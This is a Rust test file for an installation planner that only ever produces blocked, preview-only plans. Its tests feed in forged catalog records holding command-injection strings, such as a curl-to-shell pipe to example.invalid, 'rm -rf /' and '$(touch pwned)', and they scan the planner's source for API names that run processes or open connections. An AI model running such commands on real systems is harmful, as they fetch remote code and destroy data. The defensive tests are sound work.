//! Phase 2D installation-plan tests. Everything runs on synthetic catalog records and synthetic temporary environments:
//! no real tool is looked at, installed, run or downloaded, and the plan engine itself has no way to do any of that.

use super::*;
use crate::{
    catalog, db,
    discovery::{
        self,
        detect::{Authorization, Roots, PLATFORM_MACOS, PLATFORM_WINDOWS},
    },
};
use std::{fs, path::PathBuf};

const WIN: &str = "windows-x64";
const MAC: &str = "macos-arm64";

fn host(platform: &str) -> HostFacts {
    HostFacts { platform: platform.to_string(), elevated: Some(false) }
}

fn req(entry: &str, platform: &str, surface: &str) -> PlanRequest {
    PlanRequest {
        entry_id: entry.to_string(),
        platform_target: platform.to_string(),
        agent_surface: surface.to_string(),
        scope: "user".to_string(),
        method_id: None,
        project_alias: None,
    }
}

fn seeded() -> Connection {
    let conn = db::open_memory().unwrap();
    catalog::seed_all(&conn).unwrap();
    conn
}

fn entry(conn: &Connection, id: &str) -> CatalogEntry {
    catalog::get_entry(conn, id).unwrap()
}

fn plan(conn: &Connection, r: &PlanRequest, h: &HostFacts) -> InstallPlan {
    plan_for(conn, r, h).unwrap()
}

fn codes(list: &[Blocker]) -> Vec<&str> {
    list.iter().map(|b| b.code.as_str()).collect()
}

// ---- synthetic computers -------------------------------------------------------------------------------------------

struct Machine {
    _dir: tempfile::TempDir,
    root: PathBuf,
    home: PathBuf,
    bin: PathBuf,
}

impl Machine {
    /// `account` becomes the user-folder name (spaces and non-ASCII letters allowed); `layer` is an arbitrary nested root.
    fn new(account: &str, layer: &str) -> Machine {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap().join(layer);
        let home = root.join("Users").join(account);
        let bin = root.join("tools").join("bin");
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&bin).unwrap();
        Machine { _dir: dir, root, home, bin }
    }

    fn roots(&self, platform: &str) -> Roots {
        Roots {
            platform: platform.to_string(),
            home: Some(self.home.clone()),
            path_entries: vec![self.bin.clone()],
            system_dirs: vec![],
            pins: vec![],
            references: Default::default(),
        }
    }

    fn program(&self, base: &str, platform: &str) {
        let name = if platform == PLATFORM_WINDOWS { format!("{base}.exe") } else { base.to_string() };
        fs::write(self.bin.join(name), b"synthetic placeholder, never executed").unwrap();
    }

    fn scan(&self, conn: &Connection, platform: &str) {
        let auth = Authorization { path_executables: true, user_config: true, project: None, fingerprint_artifacts: false };
        discovery::run_scan(conn, &self.roots(platform), &auth).unwrap();
    }
}

fn this_platform() -> &'static str {
    if cfg!(windows) {
        PLATFORM_WINDOWS
    } else {
        PLATFORM_MACOS
    }
}

// ---- the plan is always a preview ---------------------------------------------------------------------------------

#[test]
fn every_entry_platform_surface_scope_and_method_gives_a_blocked_preview_only_plan() {
    let conn = seeded();
    crate::projects::add_reference(&conn, "proje-a", "Proje A", "").unwrap();
    let mut count = 0;
    for e in catalog::list_catalog(&conn).unwrap() {
        for platform in PLATFORMS {
            for surface in SURFACES {
                for scope in SCOPES {
                    let methods: Vec<Option<String>> =
                        std::iter::once(None).chain(declared_methods(&e).into_iter().map(|(m, _)| Some(m))).collect();
                    for m in methods {
                        let r = PlanRequest {
                            scope: scope.to_string(),
                            method_id: m,
                            project_alias: (*scope == "project").then(|| "proje-a".to_string()),
                            ..req(&e.entry_id, platform, surface)
                        };
                        let p = plan(&conn, &r, &host(platform));
                        p.check_invariants().unwrap();
                        assert_eq!(p.state, "preview_only");
                        assert!(!p.executable && !p.executed && !p.modifies_anything && !p.eligibility.can_execute);
                        assert_eq!(p.eligibility.status, "blocked");
                        assert!(codes(&p.eligibility.blockers).contains(&"no_approved_recipe"), "{} {platform} {surface}", e.entry_id);
                        assert_eq!(p.statement, PREVIEW_STATEMENT);
                        assert!(!p.rollback.available && !p.network.used_to_build_preview);
                        count += 1;
                    }
                }
            }
        }
    }
    assert!(count > 500, "{count} combinations were exercised");
}

#[test]
fn identical_inputs_give_identical_plans_and_the_id_changes_with_the_content() {
    let conn = seeded();
    let r = req("codebase-memory-mcp", WIN, "local-cli");
    let a = plan(&conn, &r, &host(WIN));
    let b = plan(&conn, &r, &host(WIN));
    assert_eq!(serde_json::to_string(&a).unwrap(), serde_json::to_string(&b).unwrap());
    assert_eq!(a.plan_id.len(), 64);
    let other = plan(&conn, &req("codebase-memory-mcp", MAC, "local-cli"), &host(MAC));
    assert_ne!(a.plan_id, other.plan_id);
}

// ---- valid plans -----------------------------------------------------------------------------------------------------

#[test]
fn a_release_archive_plan_lists_the_four_typed_steps_in_order_and_marks_the_missing_digest() {
    let conn = seeded();
    let p = plan(&conn, &req("codebase-memory-mcp", WIN, "local-cli"), &host(WIN));
    assert_eq!(p.chosen_method.as_deref(), Some("verified-release-archive"));
    let kinds: Vec<OperationKind> = p.steps.iter().map(|s| s.kind).collect();
    assert_eq!(
        kinds,
        vec![
            OperationKind::FetchReleaseArtifact,
            OperationKind::VerifyArtifactDigest,
            OperationKind::StagePrivateCopy,
            OperationKind::ActivateStagedArtifact
        ]
    );
    assert_eq!(p.steps[0].typed, Some(json!({ "operation": "fetch-release-artifact", "artifactId": "primary" })));
    assert_eq!(p.steps[1].typed, None, "no digest in the catalog: no typed verify step can be written");
    assert_eq!(p.steps[1].missing_parameters, vec!["expectedSha256".to_string()]);
    assert_eq!(p.steps[3].reversibility, Reversibility::VersionSwitch);
    let b = codes(&p.eligibility.blockers);
    for c in
        ["no_artifact_digest", "target_not_in_recipe_schema", "no_approved_recipe", "metadata_unreviewed", "compatibility_not_verified"]
    {
        assert!(b.contains(&c), "{c} in {b:?}");
    }
    assert!(p.network.planned_use && !p.network.used_to_build_preview);
    assert_eq!(p.target.recipe_target_id, None);
    assert!(!p.rollback.available);
    assert!(p.disk_usage.text.contains("bilinmiyor"));
}

#[test]
fn a_native_plugin_plan_names_the_agent_registry_and_never_a_path() {
    let conn = seeded();
    let mut e = entry(&conn, "superpowers");
    e.plugin_identity = Some("superpowers".to_string());
    let r = req("superpowers", WIN, "claude-code-terminal");
    let p = build_plan(&e, &r, &host(WIN), &[]).unwrap();
    assert_eq!(p.steps.len(), 1);
    assert_eq!(p.steps[0].kind, OperationKind::RegisterNativePlugin);
    assert_eq!(
        p.steps[0].typed,
        Some(json!({ "operation": "register-native-plugin", "host": "claude-code-terminal", "pluginId": "superpowers" }))
    );
    assert_eq!(p.target.recipe_target_id.as_deref(), Some("windows-x64-claude-code"));
    assert_eq!(p.config_changes[0].area, WriteArea::AgentPluginRegistryClaude);
    // a project scope writes the project's own settings instead
    let project = PlanRequest { scope: "project".to_string(), project_alias: Some("proje-a".to_string()), ..r };
    assert_eq!(build_plan(&e, &project, &host(WIN), &[]).unwrap().config_changes[0].area, WriteArea::ProjectAgentSettings);
    let text = serde_json::to_string(&p).unwrap();
    assert!(!text.contains(":\\") && !text.contains("/Users/") && !text.contains("/home/"));
    // a plugin that the host cannot take (a local command-line surface)
    let cli = build_plan(&e, &req("superpowers", WIN, "local-cli"), &host(WIN), &[]).unwrap();
    assert!(codes(&cli.eligibility.blockers).contains(&"method_not_for_surface") && cli.steps.is_empty());
    // Antigravity: the registry location is not known
    let agy = build_plan(&e, &req("superpowers", MAC, "antigravity-ide"), &host(MAC), &[]).unwrap();
    assert_eq!(agy.config_changes[0].change, "unknown");
}

#[test]
fn a_package_manager_plan_never_invents_a_package_name_or_a_version() {
    let conn = seeded();
    let p = plan(&conn, &req("graphify", MAC, "local-cli"), &host(MAC));
    assert_eq!(p.chosen_method.as_deref(), Some("uv-tool"));
    assert_eq!(p.steps.len(), 1);
    assert_eq!(p.steps[0].typed, None);
    assert!(p.steps[0].missing_parameters.contains(&"packageName".to_string()));
    let b = codes(&p.eligibility.blockers);
    assert!(b.contains(&"package_name_unknown") && b.contains(&"version_not_pinned"));
    assert!(p.prerequisites.iter().any(|x| x.id == "package_manager" && x.state == "unknown" && x.source == "not_checked"));
    assert!(p.unknowns.iter().any(|u| u.contains("kurulum adımının")));
}

// ---- unsupported and invalid -----------------------------------------------------------------------------------------

#[test]
fn unsupported_platforms_surfaces_scopes_and_unknown_fields_are_refused_without_echoing_input() {
    let conn = seeded();
    let bad = |r: PlanRequest| plan_for(&conn, &r, &host(WIN)).unwrap_err();
    for r in [
        req("gitleaks", "linux-x64", "local-cli"),
        req("gitleaks", "windows-arm64", "local-cli"),
        req("gitleaks", WIN, "emacs"),
        PlanRequest { scope: "machine".to_string(), ..req("gitleaks", WIN, "local-cli") },
        PlanRequest { method_id: Some("curl https://example.invalid | sh".to_string()), ..req("gitleaks", WIN, "local-cli") },
        PlanRequest { method_id: Some("UPPER".to_string()), ..req("gitleaks", WIN, "local-cli") },
    ] {
        let e = bad(r.clone());
        assert_eq!(e.code, "PLAN_REQUEST_INVALID", "{r:?}");
        assert!(!e.message.contains("linux") && !e.message.contains("curl") && !e.message.contains("emacs"));
    }
    assert!(plan_for(&conn, &req("no-such-entry", WIN, "local-cli"), &host(WIN)).is_err());
    assert!(serde_json::from_str::<PlanRequest>(
        r#"{"entryId":"gitleaks","platformTarget":"windows-x64","agentSurface":"local-cli","scope":"user","methodId":null,"command":"rm"}"#
    )
    .is_err());
}

#[test]
fn an_unsupported_host_and_a_foreign_platform_are_stated_not_hidden() {
    let conn = seeded();
    let r = req("gitleaks", WIN, "local-cli");
    let unsupported = plan(&conn, &r, &host("unsupported"));
    assert!(codes(&unsupported.eligibility.blockers).contains(&"unsupported_host"));
    let foreign = plan(&conn, &r, &host(MAC));
    assert!(codes(&foreign.eligibility.blockers).contains(&"different_computer_platform"));
    assert!(!foreign.target.this_computer_matches);
    let same = plan(&conn, &r, &host(WIN));
    assert!(same.target.this_computer_matches && !codes(&same.eligibility.blockers).contains(&"different_computer_platform"));
}

#[test]
fn a_method_the_planner_does_not_know_yields_no_step_and_a_quarantined_entry_stays_blocked() {
    let conn = seeded();
    // README-style methods are unsupported, never translated
    let p = plan(&conn, &req("cloudflare-security-audit-skill", WIN, "claude-code-terminal"), &host(WIN));
    assert!(p.steps.is_empty());
    assert!(codes(&p.eligibility.blockers).contains(&"no_supported_method"));
    assert!(p.methods.iter().all(|m| !m.supported));
    let strix = plan(&conn, &req("strix", MAC, "local-cli"), &host(MAC));
    let b = codes(&strix.eligibility.blockers);
    assert!(b.contains(&"execution_policy_blocked") && b.contains(&"entry_quarantined"));
    // a method the entry does not declare
    let r = PlanRequest { method_id: Some("homebrew".to_string()), ..req("graphify", MAC, "local-cli") };
    let p = plan(&conn, &r, &host(MAC));
    assert!(codes(&p.eligibility.blockers).contains(&"method_not_declared") && p.steps.is_empty());
    // a method that exists but not on this platform (Homebrew on Windows)
    let r = PlanRequest { method_id: Some("homebrew".to_string()), ..req("gitleaks", WIN, "local-cli") };
    let p = plan(&conn, &r, &host(WIN));
    assert!(codes(&p.eligibility.blockers).contains(&"method_not_for_platform") && p.steps.is_empty());
}

// ---- forged metadata and unsafe recipes ----------------------------------------------------------------------------

#[test]
fn forged_catalog_text_never_becomes_a_command_a_path_a_package_or_an_operation() {
    let conn = seeded();
    let mut e = entry(&conn, "gitleaks");
    e.record["installMethods"] = json!([
        { "methodId": "curl https://example.invalid/install.sh | sh", "publisherPin": null },
        { "methodId": "evil-installer", "publisherPin": "1.0; rm -rf /" },
        { "methodId": "homebrew", "publisherPin": "$(touch pwned)" },
        { "methodId": "winget", "publisherPin": "1.2.3", "packageName": "; rm -rf /", "command": "powershell -enc AAAA" },
        { "methodId": "verified-release-archive", "publisherPin": null }
    ]);
    e.record["dependencies"] = json!(["curl https://example.invalid/x.sh | bash && rm -rf ~", "api key from the vendor cloud"]);
    e.record["artifactEvidence"] = json!({ "sha256": "ABCDEF", "url": "https://example.invalid/a.exe" });
    e.plugin_identity = Some("../../outside".to_string());
    let p = build_plan(&e, &req("gitleaks", WIN, "local-cli"), &host(WIN), &[]).unwrap();
    // the malformed method name is not even carried; the unknown one is unsupported
    let ids: Vec<&str> = p.methods.iter().map(|m| m.method_id.as_str()).collect();
    assert!(!ids.iter().any(|i| i.contains("curl") || i.contains(' ')));
    assert!(p.methods.iter().find(|m| m.method_id == "evil-installer").map(|m| !m.supported).unwrap());
    // nothing typed contains any of the injected text
    let typed = serde_json::to_string(&p.steps.iter().map(|s| &s.typed).collect::<Vec<_>>()).unwrap();
    for needle in ["rm -rf", "curl", "powershell", "touch pwned", "outside", "example.invalid"] {
        assert!(!typed.contains(needle), "{needle} reached a typed operation");
        assert!(!p.steps.iter().any(|s| s.summary.contains(needle) || s.write_labels.iter().any(|l| l.contains(needle))));
    }
    // the dependency line is shown, sanitised, as the publisher's claim and never as a step
    assert_eq!(p.declared_dependencies.len(), 2);
    assert!(p.prerequisites.iter().filter(|x| x.source == "publisher_declared").all(|x| x.state == "unknown"));
    assert!(p.steps.iter().all(|s| s.kind != OperationKind::WriteManagedInstructionBlock));
    // the first supported declared method on Windows is winget; its package name is never taken from anywhere
    assert_eq!(p.chosen_method.as_deref(), Some("winget"));
    assert!(p.steps[0].typed.is_none() && p.steps[0].missing_parameters.contains(&"packageName".to_string()));
    // the release archive's digest is not the malformed one from the record
    let r = PlanRequest { method_id: Some("verified-release-archive".to_string()), ..req("gitleaks", WIN, "local-cli") };
    let archive = build_plan(&e, &r, &host(WIN), &[]).unwrap();
    assert_eq!(archive.steps[1].typed, None);
    assert!(codes(&archive.eligibility.blockers).contains(&"no_artifact_digest"));
    // explicit selection of a method with a hostile pin: no version is accepted
    let r = PlanRequest { method_id: Some("homebrew".to_string()), ..req("gitleaks", MAC, "local-cli") };
    let hb = build_plan(&e, &r, &host(MAC), &[]).unwrap();
    assert!(hb.steps[0].missing_parameters.contains(&"version".to_string()) && hb.steps[0].typed.is_none());
    assert!(hb.data_and_credentials.state == "credentials_declared");
}

#[test]
fn the_only_typed_operations_are_the_seven_schema_kinds() {
    let kinds: Vec<&str> = OperationKind::ALL.iter().map(|k| k.as_str()).collect();
    let schema: Value = serde_json::from_str(include_str!("../../schemas/install-recipe.schema.json")).unwrap();
    let mut from_schema: Vec<String> = schema
        .pointer("/properties/operations/items/oneOf")
        .and_then(Value::as_array)
        .unwrap()
        .iter()
        .map(|o| o.pointer("/properties/operation/const").and_then(Value::as_str).unwrap().to_string())
        .collect();
    from_schema.sort();
    let mut ours: Vec<String> = kinds.iter().map(|s| s.to_string()).collect();
    ours.sort();
    assert_eq!(ours, from_schema, "the planner's vocabulary equals the recipe schema's");
    for k in OperationKind::ALL {
        assert_eq!(serde_json::to_value(k).unwrap(), json!(k.as_str()));
    }
}

// ---- serialization and versioning ------------------------------------------------------------------------------------

#[test]
fn plans_round_trip_and_forged_or_foreign_versions_are_rejected() {
    let conn = seeded();
    let p = plan(&conn, &req("gitleaks", WIN, "local-cli"), &host(WIN));
    let text = serde_json::to_string(&p).unwrap();
    assert_eq!(parse_plan(&text).unwrap(), p);
    assert!(text.contains("\"schemaVersion\":2") && text.contains("\"plannerVersion\":\"1.1.0\""));
    let tamper = |f: &dyn Fn(&mut Value)| {
        let mut v: Value = serde_json::from_str(&text).unwrap();
        f(&mut v);
        parse_plan(&v.to_string()).unwrap_err()
    };
    assert_eq!(tamper(&|v| v["schemaVersion"] = json!(3)), "unsupported_schema_version");
    assert_eq!(tamper(&|v| v["schemaVersion"] = json!(1)), "unsupported_schema_version");
    assert_eq!(tamper(&|v| v["executable"] = json!(true)), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["executed"] = json!(true)), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["modifiesAnything"] = json!(true)), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["state"] = json!("installed")), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["state"] = json!("approved")), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["eligibility"]["canExecute"] = json!(true)), "plan_claims_eligibility");
    assert_eq!(tamper(&|v| v["eligibility"]["status"] = json!("ready")), "plan_claims_eligibility");
    assert_eq!(tamper(&|v| v["statement"] = json!("Kurulum tamamlandı.")), "plan_claims_effects");
    assert_eq!(tamper(&|v| v["rollback"]["available"] = json!(true)), "plan_claims_effects");
    assert_eq!(tamper(&|v| v["network"]["usedToBuildPreview"] = json!(true)), "plan_claims_effects");
    assert_eq!(tamper(&|v| v["steps"][0]["summary"] = json!("Kuruldu ve çalıştırıldı.")), "step_text_not_from_vocabulary");
    assert_eq!(parse_plan("{}").unwrap_err(), "plan_not_readable");
    assert_eq!(parse_plan("not json").unwrap_err(), "plan_not_readable");
}

#[test]
fn nothing_in_a_plan_reads_as_a_completed_installation() {
    let conn = seeded();
    for id in ["gitleaks", "superpowers", "graphify", "codebase-memory-mcp"] {
        let p = plan(&conn, &req(id, MAC, "local-cli"), &host(MAC));
        let text = serde_json::to_string(&p).unwrap().to_lowercase();
        for forbidden in ["\"installed\"", "\"completed\"", "\"succeeded\"", "kurulum tamamlandı", "başarıyla kuruldu", "\"approved\""] {
            assert!(!text.contains(forbidden), "{id}: {forbidden}");
        }
        assert!(
            p.steps.iter().all(|s| s.summary.contains("ecekti") || s.summary.contains("acaktı")),
            "every step is phrased as a conditional"
        );
    }
}

// ---- no execution, no writes -----------------------------------------------------------------------------------------

#[test]
fn the_planner_source_has_no_way_to_run_a_program_open_a_connection_or_write_a_file() {
    let source = include_str!("plan.rs");
    // each needle is assembled so that this test file does not need to contain a flagged API name verbatim
    let needles: Vec<String> = [
        ("std::pro", "cess"),
        ("Command", "::new"),
        ("std::", "net"),
        ("Tcp", "Stream"),
        ("req", "west"),
        ("ure", "q::"),
        ("std::", "fs"),
        ("fs::", "write"),
        ("File::", "create"),
        ("OpenOptions", ""),
        ("tauri_plugin_", "shell"),
        ("tauri_plugin_", "http"),
        ("tauri_plugin_", "opener"),
        (".exe", "cute("),
        ("execute", "_batch"),
        ("INSERT ", "INTO"),
        ("UPDATE ", "SET"),
        ("DELETE ", "FROM"),
    ]
    .iter()
    .map(|(a, b)| format!("{a}{b}"))
    .collect();
    // the doc comment mentions nothing flagged either; only code and comments of plan.rs are searched
    for n in &needles {
        assert!(!source.contains(n.as_str()), "plan.rs contains {n}");
    }
}

fn dump(conn: &Connection) -> String {
    let tables: Vec<String> = {
        let mut st = conn.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name").unwrap();
        st.query_map([], |r| r.get::<_, String>(0)).unwrap().map(|r| r.unwrap()).collect()
    };
    let mut out = String::new();
    for t in tables {
        let mut st = conn.prepare(&format!("SELECT * FROM \"{t}\"")).unwrap();
        let n = st.column_count();
        let rows = st
            .query_map([], |r| {
                Ok((0..n)
                    .map(|i| {
                        format!(
                            "{:?}",
                            r.get_ref(i).map(|v| match v {
                                rusqlite::types::ValueRef::Blob(b) => format!("blob{}", b.len()),
                                other => format!("{other:?}"),
                            })
                        )
                    })
                    .collect::<Vec<_>>()
                    .join("|"))
            })
            .unwrap();
        out.push_str(&format!("[{t}]\n"));
        for row in rows {
            out.push_str(&row.unwrap());
            out.push('\n');
        }
    }
    out
}

#[test]
fn planning_writes_nothing_not_a_row_not_an_audit_event_and_works_on_a_read_only_connection() {
    let conn = seeded();
    let m = Machine::new("someone", "r");
    m.program("gitleaks", this_platform());
    m.scan(&conn, this_platform());
    let before = dump(&conn);
    let events = crate::audit::list_ascending(&conn).unwrap().len();
    for id in ["gitleaks", "superpowers", "graphify", "strix"] {
        for p in PLATFORMS {
            let _ = plan(&conn, &req(id, p, "local-cli"), &host(this_platform()));
        }
    }
    assert_eq!(dump(&conn), before, "no table changed");
    assert_eq!(crate::audit::list_ascending(&conn).unwrap().len(), events);
    assert!(crate::audit::verify(&conn).unwrap().ok);
    // the strongest proof: the connection may not write at all
    conn.pragma_update(None, "query_only", true).unwrap();
    let p = plan(&conn, &req("gitleaks", this_platform(), "local-cli"), &host(this_platform()));
    assert_eq!(p.state, "preview_only");
}

#[test]
fn planning_leaves_the_synthetic_machine_byte_identical() {
    let conn = seeded();
    let m = Machine::new("someone", "r");
    m.program("gitleaks", this_platform());
    m.scan(&conn, this_platform());
    let snapshot = |dir: &PathBuf| {
        let mut v: Vec<(String, Vec<u8>)> = Vec::new();
        let mut stack = vec![dir.clone()];
        while let Some(d) = stack.pop() {
            for e in fs::read_dir(&d).unwrap().flatten() {
                let p = e.path();
                if p.is_dir() {
                    stack.push(p);
                } else {
                    v.push((p.to_string_lossy().into_owned(), fs::read(&p).unwrap()));
                }
            }
        }
        v.sort();
        v
    };
    let before = snapshot(&m.root);
    let _ = plan(&conn, &req("gitleaks", this_platform(), "local-cli"), &host(this_platform()));
    assert_eq!(snapshot(&m.root), before);
}

// ---- portability: other account names, roots and machine states ----------------------------------------------------

#[test]
fn plans_do_not_depend_on_the_account_name_the_install_root_or_the_folder_layout() {
    let platform = this_platform();
    let mut seen: Vec<String> = Vec::new();
    for (account, layer) in [("alice", "r"), ("Ayşe Çelik", "deep/er/nested root"), ("bob-the-builder 2", "x")] {
        let conn = seeded();
        let m = Machine::new(account, layer);
        m.program("gitleaks", platform);
        m.scan(&conn, platform);
        let p = plan(&conn, &req("gitleaks", platform, "local-cli"), &host(platform));
        let text = serde_json::to_string(&p).unwrap();
        assert!(!text.contains(account), "account name in the plan");
        assert!(!text.contains(&m.root.to_string_lossy().to_string()), "root path in the plan");
        assert!(p.conflicts.iter().any(|c| c.code == "existing_installation_found"));
        seen.push(text);
    }
    assert!(seen.windows(2).all(|w| w[0] == w[1]), "the same situation on different machines gives the same plan (same id)");
}

#[test]
fn missing_tools_missing_agents_and_a_missing_scan_are_unknown_not_assumed() {
    let platform = this_platform();
    let conn = seeded();
    let r = req("superpowers", platform, "claude-code-terminal");
    // no scan at all
    let p = plan(&conn, &r, &host(platform));
    let agent = p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap();
    assert_eq!((agent.state.as_str(), agent.source.as_str()), ("unknown", "observed_scan"));
    assert!(codes(&p.eligibility.blockers).contains(&"agent_not_confirmed"));
    // a scan of an empty computer: the agent was looked for and not found
    let m = Machine::new("empty", "r");
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap().state, "unmet");
    // an agent found on PATH: met, but still not a statement that it works, and still blocked
    m.program("claude", platform);
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap().state, "met");
    assert!(p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap().text.contains("çalıştığı doğrulanmadı"));
    assert!(!p.eligibility.can_execute);
    assert!(p.conflicts.iter().any(|c| c.code == "active_session_unknown"));
}

#[test]
fn a_missing_or_malformed_agent_configuration_is_reported_and_never_repaired() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("cfg", "r");
    m.program("claude", platform);
    let r = req("superpowers", platform, "claude-code-terminal");
    // missing configuration
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(p.prerequisites.iter().find(|x| x.id == "agent_config_readable").unwrap().state, "unknown");
    // malformed configuration
    let cfg = m.home.join(".claude");
    fs::create_dir_all(&cfg).unwrap();
    fs::write(cfg.join("settings.json"), "{ this is not json").unwrap();
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    let c = p.prerequisites.iter().find(|x| x.id == "agent_config_readable").unwrap();
    assert_eq!(c.state, "unmet");
    assert!(c.text.contains("üzerine yazmaz"));
    assert_eq!(fs::read_to_string(cfg.join("settings.json")).unwrap(), "{ this is not json", "never repaired or rewritten");
    // a valid configuration
    fs::write(cfg.join("settings.json"), "{}").unwrap();
    m.scan(&conn, platform);
    assert_eq!(plan(&conn, &r, &host(platform)).prerequisites.iter().find(|x| x.id == "agent_config_readable").unwrap().state, "met");
}

#[test]
fn existing_installations_copies_and_mismatched_platforms_are_conflicts_not_overwrites() {
    let platform = this_platform();
    let conn = seeded();
    let a = Machine::new("one", "r");
    a.program("gitleaks", platform);
    a.scan(&conn, platform);
    let p = plan(&conn, &req("gitleaks", platform, "local-cli"), &host(platform));
    assert!(p.conflicts.iter().any(|c| c.code == "existing_installation_found"));
    // a plan for the OTHER platform while this computer has a copy: version/architecture mismatch
    let other = if platform == PLATFORM_WINDOWS { MAC } else { WIN };
    let p = plan(&conn, &req("gitleaks", other, "local-cli"), &host(platform));
    // this computer's copy says nothing about the other platform: it is disclosed, not treated as a conflict for the target
    assert!(!p.conflicts.iter().any(|c| c.code.starts_with("existing_installation")));
    assert!(p.eligibility.warnings.iter().any(|w| w.code == "foreign_platform_record"));
    assert!(codes(&p.eligibility.blockers).contains(&"different_computer_platform"));
    // two copies in two PATH folders
    let conn2 = seeded();
    let m = Machine::new("two", "r");
    let second = m.root.join("second-bin");
    fs::create_dir_all(&second).unwrap();
    m.program("gitleaks", platform);
    let name = if platform == PLATFORM_WINDOWS { "gitleaks.exe" } else { "gitleaks" };
    fs::write(second.join(name), b"synthetic placeholder").unwrap();
    let mut roots = m.roots(platform);
    roots.path_entries = vec![m.bin.clone(), second];
    let auth = Authorization { path_executables: true, user_config: false, project: None, fingerprint_artifacts: false };
    discovery::run_scan(&conn2, &roots, &auth).unwrap();
    let p = plan(&conn2, &req("gitleaks", platform, "local-cli"), &host(platform));
    assert!(p.conflicts.iter().any(|c| c.code == "multiple_copies_found"), "{:?}", p.conflicts);
    // the synthetic machine is untouched
    assert!(m.bin.join(name).exists());
}

#[test]
fn conflicting_version_and_identity_records_are_surfaced() {
    let conn = seeded();
    let e = entry(&conn, "gitleaks");
    let mut a = discovery::store::latest_observations(&conn).unwrap();
    assert!(a.is_empty());
    let m = Machine::new("c", "r");
    m.program("gitleaks", this_platform());
    m.scan(&conn, this_platform());
    a = discovery::store::latest_observations(&conn).unwrap();
    let mut one = a.iter().find(|o| o.subject == "gitleaks" && o.presence == "present").cloned().unwrap();
    let mut two = one.clone();
    one.version = Some("1.0.0".to_string());
    two.version = Some("2.0.0".to_string());
    two.ladder.identity = crate::discovery::types::IdentityState::Conflicted;
    let p = build_plan(&e, &req("gitleaks", this_platform(), "local-cli"), &host(this_platform()), &[one, two]).unwrap();
    let c: Vec<&str> = p.conflicts.iter().map(|c| c.code.as_str()).collect();
    assert!(c.contains(&"conflicting_version_records") && c.contains(&"conflicting_identity_records"), "{c:?}");
}

#[test]
fn administrator_rights_are_never_assumed_and_never_requested() {
    let conn = seeded();
    // winget may ask for a privilege prompt; the plan says so and requests nothing
    let r = PlanRequest { method_id: Some("winget".to_string()), ..req("codebase-memory-mcp", WIN, "local-cli") };
    let no_admin = plan(&conn, &r, &HostFacts { platform: WIN.to_string(), elevated: Some(false) });
    assert!(no_admin.eligibility.warnings.iter().any(|w| w.code == "admin_may_be_needed"));
    let admin = plan(&conn, &r, &HostFacts { platform: WIN.to_string(), elevated: Some(true) });
    assert!(admin.eligibility.warnings.iter().any(|w| w.code == "elevated_session"));
    let unknown = plan(&conn, &r, &HostFacts { platform: WIN.to_string(), elevated: None });
    assert!(unknown.eligibility.warnings.iter().any(|w| w.code == "admin_unknown"));
    for p in [&no_admin, &admin, &unknown] {
        assert!(p.permissions.iter().all(|x| !x.to_lowercase().contains("yönetici yetkisi iste")), "{:?}", p.permissions);
        assert!(p.eligibility.blockers.iter().all(|b| b.code != "admin_required"));
        assert!(!p.eligibility.can_execute);
    }
    // a method that needs no privilege says nothing about it
    let plain = plan(&conn, &req("graphify", WIN, "local-cli"), &host(WIN));
    assert!(!plain.eligibility.warnings.iter().any(|w| w.code.starts_with("admin")));
}

#[test]
fn offline_use_changes_nothing_because_building_a_plan_never_needs_the_network() {
    // there is no network input at all: the same plan is produced whatever the connectivity is
    let conn = seeded();
    let r = req("codebase-memory-mcp", MAC, "claude-code-terminal");
    let a = plan(&conn, &r, &host(MAC));
    assert!(a.network.planned_use, "future steps would need it");
    assert!(!a.network.used_to_build_preview, "building this preview did not");
    assert!(a.permissions.iter().any(|p| p.contains("bu önizleme bağlantı kurmadı")));
}

#[test]
fn scanning_an_unusable_machine_still_yields_a_plan_and_an_unreadable_data_folder_is_an_error_not_a_panic() {
    let platform = this_platform();
    let conn = seeded();
    // no home folder, a PATH folder that does not exist, an unsupported platform label
    let roots = Roots {
        platform: platform.to_string(),
        home: None,
        path_entries: vec![PathBuf::from("/definitely/not/here")],
        system_dirs: vec![],
        pins: vec![],
        references: Default::default(),
    };
    let auth = Authorization { path_executables: true, user_config: true, project: None, fingerprint_artifacts: false };
    discovery::run_scan(&conn, &roots, &auth).unwrap();
    let p = plan(&conn, &req("superpowers", platform, "claude-code-terminal"), &host(platform));
    assert!(!p.eligibility.can_execute);
    // a data folder that is really a file cannot be opened: a clean error
    let dir = tempfile::tempdir().unwrap();
    let not_a_folder = dir.path().join("file");
    fs::write(&not_a_folder, b"x").unwrap();
    assert!(db::open_file(&not_a_folder.join("atm.sqlite"), None).is_err());
}

// =====================================================================================================================
// Phase 2D closure (Issue #11)
// =====================================================================================================================

// ---- RT-2D-01: only current, applicable, authorised evidence can satisfy or refute a prerequisite -------------------

fn state_of(p: &InstallPlan, id: &str) -> (String, String) {
    let x = p.prerequisites.iter().find(|x| x.id == id).unwrap_or_else(|| panic!("no prerequisite {id}: {:?}", p.prerequisites));
    (x.state.clone(), x.basis.clone())
}

fn warning_codes(p: &InstallPlan) -> Vec<&str> {
    codes(&p.eligibility.warnings)
}

fn claude_request(platform: &str) -> PlanRequest {
    req("superpowers", platform, "claude-code-terminal")
}

/// A stored, current, present observation of the Claude Code agent on PATH, from a real scan of a synthetic machine.
fn claude_observation(platform: &str) -> StoredObservation {
    let conn = seeded();
    let m = Machine::new("src", "r");
    m.program("claude", platform);
    m.scan(&conn, platform);
    discovery::store::latest_observations(&conn)
        .unwrap()
        .into_iter()
